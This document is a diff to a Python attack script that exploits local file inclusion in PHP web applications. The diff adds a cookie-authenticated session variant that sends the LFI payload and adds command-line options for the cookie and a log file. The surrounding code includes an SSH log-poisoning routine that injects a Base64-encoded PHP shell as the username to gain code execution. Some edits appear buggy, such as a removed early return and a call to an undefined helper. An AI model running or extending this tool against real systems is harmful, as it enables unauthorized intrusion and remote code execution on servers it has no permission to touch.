@@ -40,6 +40,13 @@ def exploit_lfi(url, param, lfi_payload, method="POST"):
     
     return response
 
+def session_exploit(url, cookie, param,  lfi_payload):
+    # Create an http session using the cookie
+    session = requests.Session()
+    session.cookies.set("PHPSESSID", cookie)
+    response = session.post(url, data={param: lfi_payload}, verify=False)
+    return response
+
 def ssh_log_poison(target_ip, port=22):
     """
     Performs SSH log poisoning by injecting a Base64-encoded PHP shell as the username.
@@ -69,11 +76,20 @@ def main():
     parser.add_argument("lfi_payload", help="The LFI payload")
     parser.add_argument("method", choices=["GET", "POST"], nargs="?", default="POST", help="HTTP request type")
     parser.add_argument("--ssh", action="store_true", help="Perform SSH log poisoning")
+    parser.add_argument("--cookie", help="The PHPSESSID cookie in case the vulnerability is authenticated.")
+    parser.add_argument("--log-file", help="The log file to search for.")
 
     args = parser.parse_args()
+    if not args.url or not args.param or not args.lfi_payload or not args.method:
+        parser.print_help()
 
-    response = exploit_lfi(args.url, args.param, args.lfi_payload, args.method)
-    print(response.text)
+    if args.cookie:
+        response = session_exploit(args.url, args.cookie, args.param, args.lfi_payload)
+        print(response.text)
+        
+    
+    if args.log_file:
+        detect_log_file(args.url, args.param, args.method)
 
     if args.ssh:
         parsed_url = urlparse(args.url)
@@ -81,9 +97,11 @@ def main():
         
         if not target_ip:
             print("[-] Could not determine target IP. Make sure you provide a valid URL.")
-            return
         
-        ssh_log_poison(target_ip)
-
+        ssh_log_poison(target_ip)    
+    
+    response = exploit_lfi(args.url, args.param, args.lfi_payload, args.method)
+    print(response.text)
+    
 if __name__ == "__main__":
     main()
